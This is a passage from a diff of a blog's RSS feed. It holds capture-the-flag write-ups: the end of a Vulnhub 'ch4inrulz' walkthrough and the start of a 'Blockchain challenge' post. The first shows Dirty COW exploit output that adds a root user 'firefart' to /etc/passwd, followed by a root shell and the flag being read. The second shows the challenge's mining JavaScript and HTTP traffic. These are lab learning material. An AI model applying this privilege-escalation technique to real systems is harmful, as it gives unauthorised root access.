+mmap: 7ffa136a2000
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'test'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'test'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+
+
+www-data@ubuntu:/tmp$ su firefart
+su firefart
+Password: test
+
+firefart@ubuntu:/tmp# cd /root
+cd /root
+firefart@ubuntu:~# ls -la
+ls -la
+total 32
+drwx------  4 firefart root 4096 2018-04-14 07:36 .
+drwxr-xr-x 22 firefart root 4096 2018-04-13 16:10 ..
+drwx------  2 firefart root 4096 2018-04-13 16:06 .aptitude
+-rw-------  1 firefart root   82 2018-07-31 07:44 .bash_history
+-rw-r--r--  1 firefart root 3106 2010-04-23 02:45 .bashrc
+drwxr-xr-x  2 firefart root 4096 2018-04-14 07:32 .cache
+-rw-r--r--  1 firefart root  140 2010-04-23 02:45 .profile
+-rw-r--r--  1 firefart root   33 2018-04-14 07:36 root.txt
+firefart@ubuntu:~# cat root.txt
+cat root.txt
+8f420533b79076cc99e9f95a1a4e5568&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Sun, 19 Aug 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/vulnhub-ch4inrulz/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-ch4inrulz/</guid>
+      </item>
+    
+      <item>
         <title>Vulnhub.com - Zico2</title>
         <description>&lt;p&gt;In this post we’re going to finish a quick machine from Vulnhub called &lt;strong&gt;Zico2&lt;/strong&gt;.&lt;/p&gt;
 
@@ -3663,206 +4170,6 @@ You find 5 flags and got their points and finish the first scenario....&lt;/span
         <pubDate>Wed, 27 Jun 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/vulnhub-jis-ctf/</link>
         <guid isPermaLink="true">http://localhost:4000/vulnhub-jis-ctf/</guid>
-      </item>
-    
-      <item>
-        <title>Blockchain challenge</title>
-        <description>&lt;p&gt;I got this challenge from my friend &lt;strong&gt;Yodak&lt;/strong&gt;, with simple instruction - become a millionaire. At first we are presented with a webpage containing 2 forms - register and login.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;dir=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ltr&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;gray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-
-    Elo,
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/register&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Register&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;After we have our account, we can see that it’s an app that will let’s us send virtual currency into other users account. In addition we have &lt;code class=&quot;highlighter-rouge&quot;&gt;mineBlock&lt;/code&gt; button. After sending small amount of money, we have to mine that block in order to complete the transfer.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/blockchain-challenge/main.png&quot; alt=&quot;Main Page&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After trying different techniques like sending negative numbers, I decided to take a look at the Javascript part of page source.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;handleBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mine'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;checked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mine'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;checked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;mineBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hashed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hashed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nonce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strToHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;previusHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;date&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;hashed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;strToHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hashed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/sendblock&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;application/json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readyState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;handleBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ERRORRRRR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handleBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mineBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/getblock&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;application/json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readyState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-          &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
-            &lt;span class=&quot;nx&quot;&gt;reject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;In here we can see two additional pages - &lt;code class=&quot;highlighter-rouge&quot;&gt;getblock&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;sendblock&lt;/code&gt; that are used in transactions. In addition, we can see that the information is passed using JSON so I decided to fire up BurpSuite and take a look at that information. In additon we have information that the hash i created from &lt;code class=&quot;highlighter-rouge&quot;&gt;newBlock.previusHash + newBlock.date + newBlock.transactions + newBlock.nonce&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Firstly, let’s make a small transfer.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;POST /user HTTP/1.1
-Host:  
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http:// /user
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 17
-Cookie: session=eyJ1c2VyIjoiZyJ9.De86bA._5mt5MP3jSvnrSa93vYjwjiywsA
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-
-adress=g&amp;amp;amount=5&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we’re ready to turn on the miner and see the traffic. Firstly we get the response from &lt;code class=&quot;highlighter-rouge&quot;&gt;getblock&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;HTTP/1.0 200 OK
-Content-Type: text/html; charset=utf-8
-Content-Length: 211
-Vary: Cookie
-Server: Werkzeug/0.14.1 Python/3.4.2
